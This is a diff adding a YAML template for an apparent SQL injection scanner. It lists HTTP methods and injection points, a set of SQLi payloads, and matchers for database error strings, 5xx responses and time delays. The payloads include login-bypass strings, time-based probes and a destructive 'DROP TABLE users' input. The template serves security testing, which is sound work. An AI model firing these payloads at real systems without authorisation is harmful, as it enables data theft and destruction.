@@ -1,0 +1,54 @@
+# templates/sqli.yaml
+# piece 4 의 임시 템플릿을 통합 포맷으로 정식화
+
+id: sqli-error-time
+
+info:
+  name: "SQL Injection Scan"
+  severity: "critical"
+  description: "DB 에러 및 시간 지연을 이용한 통합 SQLi 스캔"
+
+# 엔진이 공격을 수행할지 결정하는 필터링 조건
+definition:
+  method:
+    - GET
+    - POST
+    - PUT
+  position:
+    - query
+    - body
+    - cookie
+    - header
+    - form_field
+
+payloads:
+  - "' OR 1=1--"          # 에러/논리 우회
+  - "' OR '1'='1"
+  - "1; DROP TABLE users--"
+  - "sleep(5)"            # MySQL 시간 지연
+  - "'; WAITFOR DELAY '0:0:5'--"  # MSSQL 시간 지연
+  - "' AND SLEEP(5)--"
+
+matchers-condition: or
+
+matchers:
+  - type: word
+    words:
+      - "sql syntax"
+      - "mysql_fetch"
+      - "ora-"
+      - "pg_query"
+      - "sqlite"
+      - "syntax error"
+      - "unclosed quotation"
+      - "you have an error in your sql"
+      - "warning: mysql"
+      - "odbc microsoft access"
+
+  - type: status
+    status:
+      - 500
+      - 503
+
+  - type: time
+    delay: 5
